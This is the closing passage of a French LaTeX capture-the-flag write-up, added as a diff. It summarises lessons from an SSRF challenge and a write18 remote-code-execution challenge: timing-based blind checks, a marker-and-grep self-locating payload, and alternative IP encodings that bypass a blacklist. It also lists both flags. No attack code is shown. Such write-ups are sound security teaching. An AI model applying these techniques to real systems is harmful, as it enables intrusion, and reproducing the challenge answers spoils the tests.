+        pour identifier lequel, s'il en existe un, influence le resultat.
+        Le challenge 2 a demande plus d'une dizaine d'iterations de ce
+        type avant la percee.
+  \item \textbf{Verifier a l'aveugle quand on ne voit rien.} Le test de
+        timing (\texttt{sleep}) et le test navigateur-reel sont deux
+        techniques classiques pour distinguer « ca ne s'execute pas »
+        de « ca s'execute mais je ne vois pas le resultat » -- une
+        distinction cruciale qui a change toute la direction de
+        l'investigation.
+  \item \textbf{Faire que la cible se documente elle-meme.} Plutot que
+        de deviner un chemin par tatonnement (approche qui echoue vite
+        des que l'espace de recherche grandit), le payload
+        auto-localisant (marqueur unique + \texttt{grep}) a transforme
+        un probleme de devinette en un probleme de decouverte
+        deterministe.
+\end{enumerate}
+
+\vspace{1em}
+\begin{center}
+\renewcommand{\arraystretch}{1.4}
+\begin{tabularx}{\textwidth}{@{}l X X@{}}
+\toprule
+& \textbf{Challenge 1 (SSRF)} & \textbf{Challenge 2 (\texttt{write18})} \\
+\midrule
+Classe de vuln. & Server-Side Request Forgery & Remote Code Execution via
+  compilation non sandboxee \\
+Protection contournee & Liste noire de chaines IP & Aucune (le vrai
+  obstacle etait la syntaxe, pas une protection) \\
+Outil decisif & Encodage d'adresses IP alternatives & Payload
+  auto-localisant (marqueur + \texttt{grep} borne) \\
+Flag & \texttt{s3rv3r\_s1d3\_r3qu3st\_f0rg3ry} & \texttt{CTF\_Cyberini\_4LIFE} \\
+\bottomrule
+\end{tabularx}
+\end{center}
+
+\end{document}
